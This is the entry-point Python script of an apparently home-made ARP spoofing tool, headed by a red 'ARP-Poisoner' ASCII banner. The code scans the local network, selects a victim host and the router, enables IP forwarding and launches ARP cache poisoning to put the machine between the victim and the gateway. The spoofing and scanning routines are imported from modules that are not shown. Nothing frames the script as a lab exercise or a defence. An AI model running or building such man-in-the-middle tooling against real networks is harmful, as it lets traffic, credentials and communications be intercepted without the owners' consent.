from rich.console import Console
from rich.text import Text
from .network_utils import scan_network, select_target, toggle_forwarding, get_router
from .spoofer_logic import spoof


console = Console()

banner = r"""
   _____ ____________________         __________      .__                                  
  /  _  \\______   \______   \        \______   \____ |__| __________   ____   ___________ 
 /  /_\  \|       _/|     ___/  ______ |     ___/  _ \|  |/  ___/  _ \ /    \_/ __ \_  __ \
/    |    \    |   \|    |     /_____/ |    |  (  <_> )  |\___ (  <_> )   |  \  ___/|  | \/
\____|__  /____|_  /|____|             |____|   \____/|__/____  >____/|___|  /\___  >__|   
        \/       \/                                           \/           \/     \/             
"""

lines = banner.splitlines()

colors = ["#3b0000", "#660000", "#990000", "#cc0000", "#ff0000", "#ff3333"]

colored = Text()

for i, line in enumerate(lines):
    colored.append(line + "\n", style=colors[i % len(colors)])

console.print(colored)



def main():
    print("[+] Starting network scan...")

    scan_network()

    target_ip, target_mac = select_target()

    if not target_ip:
        print("[red][-] No target selected. Exiting.")
        return
    
    router_ip, router_mac = get_router()

    if not router_ip:
        print("[red][-] Router not found. Exiting.")
        return
    
    print("[+] Enabling IP forwarding...")
    toggle_forwarding(True)

    print("[+] Starting ARP spoofing...")
    spoof(target_ip, target_mac, router_ip, router_mac)

if __name__ == "__main__":
    main()